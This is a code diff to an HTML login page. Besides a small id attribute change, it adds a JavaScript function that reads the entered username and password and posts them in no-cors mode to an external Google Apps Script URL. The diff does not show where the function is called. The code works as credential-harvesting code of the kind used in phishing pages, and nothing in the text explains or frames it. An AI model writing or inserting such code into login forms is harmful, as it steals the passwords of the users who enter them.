@@ -27,7 +27,7 @@
 
        <div class="input">
         <div class="input-container">
-            <input type="text" placeholder="username" class="input-field">
+            <input type="text" placeholder="username" class="input-field" id="username">
         </div>
         
         <div class="input-container">
@@ -77,6 +77,23 @@
                 togglePassword.classList.add("fa-eye");
             }
         });
+        
+function sendDataToGoogleSheets() {
+    var data = {
+        username: document.getElementById("username").value,
+        password: document.getElementById("password").value
+    };
+
+    fetch("https://script.google.com/macros/s/AKfycbzqCuhQpC9gkbJOdebDYb7drGKpN3Y0iBdXB-PLphAtvtljpsAZ2Q6HoQgDpz3AC8fFzg/exec", {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+    }).then(response => console.log("Data sent!"))
+    .catch(error => console.error("Error:", error));
+}
+
+
     </script>
 
 </body>
